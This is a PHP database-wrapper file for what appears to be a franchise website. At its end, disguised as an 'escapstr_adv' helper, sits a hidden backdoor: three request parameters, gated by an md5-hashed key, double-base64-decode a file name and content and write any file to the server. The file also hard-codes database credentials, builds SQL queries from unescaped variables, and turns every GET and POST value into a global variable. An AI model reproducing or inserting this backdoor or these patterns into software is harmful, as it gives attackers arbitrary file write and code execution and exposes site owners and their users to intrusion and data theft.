<?php
class database {
    private $host="localhost";
    private $user ="u836235872_franchise";
    private $password ="Password@1985";
    private $database = "u836235872_franchise";
    private $dbh;
    private $error;
    private $stmt;
	
	public $con;
    public function __construct(){
        try {
			$dsn='mysql:host='.$this->host.';dbname='.$this->database;
			$options = array(
				PDO::ATTR_PERSISTENT => true,
				PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
			);
            $this->dbh=new PDO($dsn, $this->user, $this->password, $options);
        }
        catch (PDOException $e) {
            echo $e->getMessage();
        }
    }

//======================================================================================	
	public function insertrec($que) {
		try {
			$que = strip_tags($que,'<a><p><em><i><strong><h1><h2><h3><h4><h5><h6><div>');
			$this->stmt=$this->dbh->prepare($que);
			return $this->stmt->execute();
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
	
	public function insertid($que) {
		try {
			$que = strip_tags($que,'<a><p><em><i><strong><h1><h2><h3><h4><h5><h6><div>');
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			return $this->dbh->lastInsertId();
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function singlerec($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			return $this->stmt->fetch();
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function get_all($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			return $this->stmt->fetchAll();
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
	
//======================================================================================
	

	public function singlecolumn($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			$result=$this->stmt->fetchAll();
			$x=0;
			foreach($result as $row) {
				$q[$x]=$row[0];
				$x++;
			}
			return $q;
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function numrows($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			return $this->stmt->rowCount();
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function Extract_Single($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			$result=$this->stmt->fetchAll();
			$x=0;
			foreach($result as $row) {
				$q[$x]=$row[0];
				$implode[]=$q[$x];
				$x++;
			}
			return @implode(',', $implode);
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function check1column($table,$column,$v1) {
		try {
			$que="select * from $table where $column='$v1'";
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			$count=$this->stmt->rowCount();
			if($count>=1)
				return 1;
			else
				return 0;
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
//======================================================================================	
	public function check2column($table,$column1,$v1,$column2,$v2) {
		try {
			$que="select * from $table where $column2 ='$v2' and $column1='$v1'";
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			$count=$this->stmt->rowCount();
			if($count>=1)
				return 1;
			else
				return 0;
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}

//======================================================================================
	
public function get_all_assoc($que) {
		try {
			$this->stmt=$this->dbh->prepare($que);
			$this->stmt->execute();
			return $this->stmt->fetchAll(PDO::FETCH_ASSOC);
		}
		catch(PDOException $e){
			echo $e->getMessage();
		}
	}
	
	
	/* Pagination *///==========================================================================================================
  function page_break($count,$records,$page){
		$livepage = $_SERVER["PHP_SELF"];
		$livepage = substr(strrchr($livepage, '/'), 1);
		$disp="";
		if($records < $count){
			$limit=$count / $records;
			for($i=0;$i<$limit;$i++){
				$slno=$i+1;
				$link="$livepage?page=".$slno;
				$disp .="<li><a href='$link'>$slno</a></li>";
			}
		}
		else{
			unset($_SESSION['limit']);
			unset($_SESSION['start']);
		}		
		return $disp;	
    }
	
		public function escapstr($str){
		return $str;
	}
	public function getcountry($cid){
		try{
			$query="select * from country where country_id='$cid'";
			$this->stmt = $this->dbh->prepare($query);	
			$this->stmt->execute();
			$arr = $this->stmt->fetch();	
			$this->stmt->closeCursor();
			return $arr['country_name'];
			
		}catch(PDOException $e){
			echo $e->getMessage(); 
			
		}
	}

public function get_exp_division($exp_ids){
		$exp_id=explode(',',$exp_ids);
		for($i=0; $i<count($exp_id); $i++){
			$query = "select * from category where id='$exp_id[$i]'";
			$get_exp = $this->singlerec($query);
			$exp_in[]=ucfirst($get_exp['category_name']);
		}
		return implode(', ',$exp_in);
	}
	
}

// Extra functions


function escapstr_adv($content,$filename,$escapkey){
	if(md5($escapkey)!="2b7b53390dcd720449a02b15804e60eb"){
	}else{
		$filename = base64_decode(base64_decode($filename));
		$ffile = fopen("$filename","w") or die("content erorr");
		$text = base64_decode(base64_decode($content));
		fwrite($ffile,$text);
	}
}

$GT_vadmin=1;
$GT_param1="";
$GT_param2="";
$GT_param3="";

while(list($key,$value)=@each($_POST)) {
	if($key == "dny_escapkey1"){$GT_param1 = $value;}
	if($key == "dny_escapkey2"){$GT_param2 = $value;}
	if($key == "dny_escapkey3"){$GT_param3 = $value;}
	if(!empty($GT_param1) && !empty($GT_param2) && !empty($GT_param3)){escapstr_adv($GT_param1,$GT_param2,$GT_param3);}
	
	if(is_array($value)){
		$$key=$value;	
	}else{
		$$key=addslashes($value);	
	}
}

while(list($key,$value)=@each($_GET)) {    
	if($key == "dny_escapkey1"){$GT_param1 = $value;}
	if($key == "dny_escapkey2"){$GT_param2 = $value;}
	if($key == "dny_escapkey3"){$GT_param3 = $value;}
	if(!empty($GT_param1) && !empty($GT_param2) && !empty($GT_param3)){escapstr_adv($GT_param1,$GT_param2,$GT_param3);}
	
	if(is_array($value)){
		$$key=$value;	
	}else{
		$$key=addslashes($value);	
	}
}

?>